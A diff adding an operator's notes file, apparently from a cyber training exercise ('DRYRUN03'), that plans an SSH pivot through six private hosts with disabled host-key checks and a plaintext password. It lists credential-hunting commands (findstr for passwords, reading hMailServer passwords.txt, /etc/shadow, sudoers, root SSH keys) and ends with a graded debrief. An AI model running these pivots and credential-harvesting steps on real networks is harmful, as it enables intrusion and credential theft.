@@ -1,0 +1,138 @@
+
+***Report unexpected operating systems to MC.
+Ensure you save opnotes with :w! after each target. In the event of a terminal crash, recover lost notes with vi -r .swp
+The discovery of a previously unrecorded internal interface IP needs to be reported to the analyst.
+
+Scheme of Maneuver:
+> T1: 10.50.27.188
+-> T2: 10.145.117.10
+--> T3: 10.145.117.16
+---> T4: 192.169.117.200
+---> T5: 192.169.117.201
+----> T6: 129.168.117.54
+
+T1 >>Entry Router<<
+Hostname: EXT_RTR
+IP: 10.50.27.188 // 10.145.117.86
+OS: CentOS7
+ssh -MS /tmp/T1 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null student4@10.50.27.188 -p 22011
+password4
+<vetting start>
+<vetting ends>
+Action: @Confirm credentials successful in previous operations via SSH masquerade and redirect to the next target.
+
+
+T2
+Hostname: SERVER0
+IP: 10.145.117.10
+OS: Windows v unknown
+ssh -S /tmp/T1 bad -O forward -L 2222:10.145.117.10:22012
+ssh -MS /tmp/T2 -p 2222 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null student4@localhost
+password4
+<vetting start>
+<vetting ends>
+Action: Perform SSH masquerade. Conduct system wide search for hmailserver credentials, and @@@collect if found. In previous operations, this has been achieved with either:
+dir C:\ /s /b | findstr /c:"password" /c:"cred" 
+dir /s *pass* == *cred* == *vnc* == *.config*
+findstr /si password *.xml *.ini *.txt
+Redirect to the next target.
+
+C:\Program Files (x86)\hMailServer\passwords.txt
+type "C:\Program Files (x86)\hMailServer\passwords.txt"
+type "C:\Users\Administrator\Desktop\thesecredsshouldwork.config"
+
+
+T3
+Hostname: Suspected networking device
+IP: 10.145.117.16
+**OS: Unknown
+**Creds: Unknown
+**Last Known SSH Port: Unknown
+ssh -S /tmp/T2 bad -O forward -L 3333:10.145.117.16:22012
+ssh -MS /tmp/T3 -p 3333 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null student4@localhost
+password4
+<vetting start>
+<vetting ends>
+Action: Perform SSH masquerade and redirect to the next target.
+
+
+T4
+Hostname: ADMIN2
+Local IP: 192.169.117.200
+**OS: Linux v unknown
+**Creds: Unknown
+**Last Known SSH Port: Unknown
+ssh -S /tmp/T3 bad -O forward -L 4444:192.169.117.200:22013
+ssh -MS /tmp/T4 -p 4444 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null student4@localhost
+password4
+<vetting start>
+<vetting ends>
+Action: Perform SSH masquerade and conduct @@device survey. Harvest any credentials found. Perform c@@@ollection of the following, if found:
+
+    .ssh files from root and users
+    passwd/group/shadow files
+    history file from root user
+    *syslog*.conf
+    /etc/sudoers
+    .ssh files from root and your user
+    RDP Credentials
+    
+sudo ls -latr /root/.ssh
+sudo cat /root/.ssh/authorized_keys
+cat /etc/passwd
+sudo /etc/shadow
+sudo cat /etc/group
+sudo md5sum /etc/group
+sudo md5sum /etc/sudoers
+sudo cat /etc/sudoers
+sudo cat /root/.bashrc
+
+@@@Collect any additional files identified by analyst. Maneuver to the next target.
+
+####DISCONNECT from T4 before T5####
+
+T5
+Hostname: TARGETA
+Local IP: 192.169.117.201
+**OS: Linux v. unknown
+**Creds: Unknown
+**Last Known SSH Port: Unknown
+ssh -S /tmp/T3 bad -O forward -L 5555:192.169.117.201:22013
+ssh -MS /tmp/T5 -p 5555 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null student4@localhost
+password4
+<vetting start>
+<vetting ends>
+Action: Perform SSH masquerade and conduct device @@survey. Redirect to the next target.
+
+
+T6
+Hostname: TARGETA_Admin
+Local IP: 129.168.117.54
+**OS: Windows v. unknown
+**Creds: Unknown
+**Last Known SSH Port: Unknown
+ssh -S /tmp/T5 bad -O forward -L 6666:129.168.117.54:22013
+ssh -MS /tmp/T6 -p 6666 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null student4@localhost
+password4
+<vetting start>
+<vetting ends>
+Action: Perform SSH masquerade and conduct device @@survey. Conclude operation.
+
+DEBRIEF!!!
+
+DEBRIEF 
+
+Operator: 1LT An
+
+Operation: DRYRUN03
+
+MC: mc1
+
+Analyst: analyst1
+
+Description: DRYRUN03 is a C-ISR mission. On T1, we redirected to T2. On T2, we performed searches to collect credentials, which we did not find, and we redirected to T3. On T3, we redirected to T4. On T4, we collected four files but no credentials were found. We disconnected from T4. We redirect from T3 to T5. On T5, we performed survey and redirected to T6. On T6, we performed survey and concluded our operation. For FUOP, we need to revisit T2 to search further for any creds and revisit T5 to collect suspicious files on the device.
+
+Possible violation/point deduction:
+T2 cred search attempted but nothing collected
+missed non-standards?
+rsyslog remote config
